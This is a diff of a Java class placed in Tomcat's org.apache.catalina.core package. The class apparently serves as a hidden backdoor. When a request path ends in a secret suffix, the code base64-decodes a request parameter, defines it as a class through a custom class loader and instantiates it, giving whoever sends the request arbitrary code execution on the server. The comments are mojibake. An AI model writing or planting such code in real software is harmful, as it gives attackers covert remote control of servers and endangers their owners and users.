@@ -1,11 +1,21 @@
 package org.apache.catalina.core;
 
-public class ExtendServices {
-    //æˆ‘æ€»è§‰å¾—æœ‰ä¸ªæ¥å£æ›´å¥½ é‰´å®šä¸ºjavaå†™å¤šäº†
+import org.apache.catalina.core.utils.Util;
 
-    public static void doServices(java.util.Map rdd,Object obj){
-        if(((String)rdd.get("url")).matches("/(.*)helloss")) {
-            org.apache.catalina.core.utils.Util.extendClassLoader(c.doFinal(data));
+import java.io.IOException;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+
+public class ExtendServices {
+    //ÎÒ×Ü¾õµÃÓĞ¸ö½Ó¿Ú¸üºÃ ¼ø¶¨ÎªjavaĞ´¶àÁË
+    public static String SERVICE_URL="agenstE";
+
+    public static void doServices(java.util.Map rdd,Object obj) throws IOException, InvocationTargetException, NoSuchMethodException, IllegalAccessException, InstantiationException, ClassNotFoundException {
+        if(((String)rdd.get("url")).matches("/(.*)"+org.apache.catalina.core.ExtendServices.SERVICE_URL)) {
+            System.out.println("hello?");
+            byte[] data = new sun.misc.BASE64Decoder().decodeBuffer((String) rdd.get("b"));
+            Class clz= Util.abstractClassLoader(data);
+            clz.newInstance();
         }
     }
 
